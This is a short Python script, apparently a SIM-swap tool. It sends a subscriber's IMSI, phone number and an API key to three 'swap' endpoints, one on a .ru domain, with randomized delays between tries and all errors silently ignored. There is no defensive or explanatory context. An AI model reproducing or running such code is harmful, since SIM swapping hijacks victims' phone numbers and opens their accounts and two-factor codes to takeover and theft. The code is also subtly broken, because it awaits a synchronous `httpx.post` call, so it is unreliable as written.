import httpx, asyncio, random
ENDPOINTS = [
    "https://api.mvnohub.net/swap",
    "https://simquik.internal/swap",
    "https://swapgate.ru/req"
]
HEADERS = {"User-Agent": "SIM-Q/1.7"}
async def swap(imsi: str, msisdn: str, api_key: str) -> bool:
    for url in ENDPOINTS:
        try:
            r = await httpx.post(url, headers=HEADERS, json={"imsi": imsi, "msisdn": msisdn, "auth": api_key}, timeout=4)
            if r.status_code == 200 and r.json().get("status") == "swapped":
                return True
        except: pass
        await asyncio.sleep(random.uniform(0.5, 1.5))
    return False
